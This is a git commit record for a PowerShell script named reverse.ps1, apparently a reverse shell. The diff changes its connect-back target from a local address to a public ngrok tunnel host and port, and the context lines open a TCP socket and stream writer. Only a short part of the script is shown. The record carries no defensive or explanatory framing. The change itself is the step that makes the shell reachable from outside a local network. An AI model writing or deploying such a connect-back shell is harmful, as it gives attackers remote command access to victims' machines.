a6236e8160bb8bcb80a0d4679308c332458b3501
rikuru_to <54424613+rikuru-to865@users.noreply.github.com>
2021-09-20 22:15:03 +0900

    Update reverse.ps1
    ngo

--- reverse.ps1
+++ reverse.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('192.168.0.10', 4444);
+$socket = new-object System.Net.Sockets.TcpClient('2.tcp.ngrok.io', 18835);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
